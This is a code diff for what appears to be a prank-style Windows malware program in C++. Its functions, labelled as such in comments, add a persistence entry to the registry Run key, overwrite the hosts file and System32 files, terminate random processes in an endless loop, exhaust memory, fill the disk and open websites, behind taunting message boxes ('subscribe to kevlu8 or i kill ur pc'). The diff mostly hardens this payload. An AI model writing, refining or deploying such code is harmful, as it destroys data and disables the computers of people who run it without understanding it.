@@ -2,6 +2,8 @@
 #define fori(x) for (INT i = 0; i < x; i++)
 #define whiletrue while (true)
 
+HDC hDesk = GetDC(NULL);
+
 int rickroll() {
 	ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_HIDE);
 
@@ -29,6 +31,8 @@ int p1()
 	msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
 	HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);
 
+	CloseHandle(hmsg2);
+	CloseHandle(hmsg3);
 	return 0;
 }
 
@@ -65,6 +69,9 @@ int p2()
 
 		Beep(rand() % 30000, rand() % 1000);
 	}
+	CloseHandle(hmsg3);
+	CloseHandle(hmsg2);
+	ReleaseDC(desk);
 	return 0;
 }
 
@@ -88,24 +95,43 @@ int p3()
 		BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
 	}
 
+	ReleaseDC(NULL, desk);
+
 	return 0;
 }
 
 //Corrupt the registry
 int p4()
 {
-	MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
+	//Create an asynchronous messagebox
+	MSGBOXPARAMS msg = {0};
+	msg.cbSize = sizeof(MSGBOXPARAMS);
+	msg.hwndOwner = NULL;
+	msg.hInstance = GetModuleHandle(NULL);
+	msg.lpszText = "Some very funny things are happening right now!";
+	msg.lpszCaption = ":)";
+	msg.dwStyle = MB_OK | MB_ICONHAND;
+	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
 	HKEY hKey;
 	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
 	RegSetValueEx(hKey, "Xytharis", 0, REG_SZ, (BYTE *)"C:\\Windows\\System32\\cmd.exe", strlen("C:\\Windows\\System32\\cmd.exe"));
 	RegCloseKey(hKey);
+	CloseHandle(hmsg);
 	return 0;
 }
 
 //Corrupt the file system
 int p5()
 {
-	MessageBoxW(NULL, L"Some very funny things are happening right now", L":thinking:", MB_OK | MB_ICONHAND);
+	MSGBOXPARAMS msg = {0};
+	msg.cbSize = sizeof(MSGBOXPARAMS);
+	msg.hwndOwner = NULL;
+	msg.hInstance = GetModuleHandle(NULL);
+	msg.lpszText = "Some very funny things are happening right now!";
+	msg.lpszCaption = ":)";
+	msg.dwStyle = MB_OK | MB_ICONHAND;
+	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
+
 	fori(100)
 	{
 		HANDLE hFile = CreateFileA("C:\\Windows\\System32\\drivers\\etc\\hosts", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -149,13 +175,22 @@ int p5()
 		VirtualFree(lpBuffer2, 0, MEM_RELEASE);
 		CloseHandle(hFile);
 	}
+	CloseHandle(hmsg);
 	return 0;
 }
 
 //Corrupt current memory
 int p6()
 {
-	MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONHAND);
+	MSGBOXPARAMS msg = {0};
+	msg.cbSize = sizeof(MSGBOXPARAMS);
+	msg.hwndOwner = NULL;
+	msg.hInstance = GetModuleHandle(NULL);
+	msg.lpszText = "Some very funny things are happening right now!";
+	msg.lpszCaption = ":)";
+	msg.dwStyle = MB_OK | MB_ICONHAND;
+	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
+
 	fori(100)
 	{
 		LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
@@ -169,6 +204,7 @@ int p6()
 		}
 		VirtualFree(lpBuffer, 0, MEM_RELEASE);
 	}
+	CloseHandle(hmsg);
 	return 0;
 }
 
@@ -224,14 +260,15 @@ int p7()
 //Terminate random running processes
 int p8()
 { 
-	fori(100)
+	whiletrue
 	{
-		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, rand() % 100);
+		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, rand() % 10000);
 		if (hProcess == NULL)
 		{
 			break;
 		}
 		TerminateProcess(hProcess, 0);
+		CloseHandle(hProcess);
 	}
 	return 0;
 }
@@ -239,7 +276,15 @@ int p8()
 //Leak Memory
 int p9()
 {
-	MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
+	MSGBOXPARAMS msg = {0};
+	msg.cbSize = sizeof(MSGBOXPARAMS);
+	msg.hwndOwner = NULL;
+	msg.hInstance = GetModuleHandle(NULL);
+	msg.lpszText = "Some very funny things are happening right now!";
+	msg.lpszCaption = ":)";
+	msg.dwStyle = MB_OK | MB_ICONHAND;
+	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
+ 
 	fori(100)
 	{
 		LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
@@ -249,13 +294,22 @@ int p9()
 		}
 		VirtualFree(lpBuffer, 0, MEM_RELEASE);
 	}
+	CloseHandle(hmsg);
 	return 0;
 }
 
 //Hog all available memory
 int p10()
 {
-	MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
+	MSGBOXPARAMS msg = {0};
+	msg.cbSize = sizeof(MSGBOXPARAMS);
+	msg.hwndOwner = NULL;
+	msg.hInstance = GetModuleHandle(NULL);
+	msg.lpszText = "Some very funny things are happening right now!";
+	msg.lpszCaption = ":)";
+	msg.dwStyle = MB_OK | MB_ICONHAND;
+	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
+
 	fori(5000)
 	{
 		LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
@@ -264,13 +318,23 @@ int p10()
 			break;
 		}
 	}
+
+	CloseHandle(hmsg);
 	return 0;
 }
 
 //Fill up the entire hard drive
 int p11()
 {
-	MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
+	MSGBOXPARAMS msg = {0};
+	msg.cbSize = sizeof(MSGBOXPARAMS);
+	msg.hwndOwner = NULL;
+	msg.hInstance = GetModuleHandle(NULL);
+	msg.lpszText = "Some very funny things are happening right now!";
+	msg.lpszCaption = ":)";
+	msg.dwStyle = MB_OK | MB_ICONHAND;
+	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
+
 	std::ofstream file;
 	file.open("fill");
 	fori(100)
@@ -322,13 +386,23 @@ int p11()
 		CloseHandle(hFile);
 	}
 	file.close();
+
+	CloseHandle(hmsg);
 	return 0;
 }
 
 //Open random system programs
 int p12()
 {
-	MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
+	MSGBOXPARAMS msg = {0};
+	msg.cbSize = sizeof(MSGBOXPARAMS);
+	msg.hwndOwner = NULL;
+	msg.hInstance = GetModuleHandle(NULL);
+	msg.lpszText = "Some very funny things are happening right now!";
+	msg.lpszCaption = ":)";
+	msg.dwStyle = MB_OK | MB_ICONHAND;
+	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
+
 	fori(100)
 	{
 		HANDLE hFile = CreateFileA("C:\\Windows\\System32\\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -372,13 +446,22 @@ int p12()
 		VirtualFree(lpBuffer2, 0, MEM_RELEASE);
 		CloseHandle(hFile);
 	}
+	CloseHandle(hmsg);
 	return 0;
 }
 
 // Open a website
 int p13() 
 {
-	MessageBoxW(NULL, L"sub 2 kevlu8", L"do it or i kill ur pc", MB_OK | MB_ICONINFORMATION);
+	MSGBOXPARAMS msg = {0};
+	msg.cbSize = sizeof(MSGBOXPARAMS);
+	msg.hwndOwner = NULL;
+	msg.hInstance = GetModuleHandle(NULL);
+	msg.lpszText = "subscribe to kevlu8 or i kill ur pc";
+	msg.lpszCaption = "do it";
+	msg.dwStyle = MB_OK | MB_ICONHAND;
+	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
+
 	fori(100)
 	{
 		LPCSTR urls[] = {
@@ -401,6 +484,7 @@ int p13()
 		Sleep(rand() % 10000);
 		ShellExecuteA(NULL, "open", urls[rand() % 14], NULL, NULL, SW_HIDE);
 	}
+	CloseHandle(hmsg);
 	return 0;
 }
 
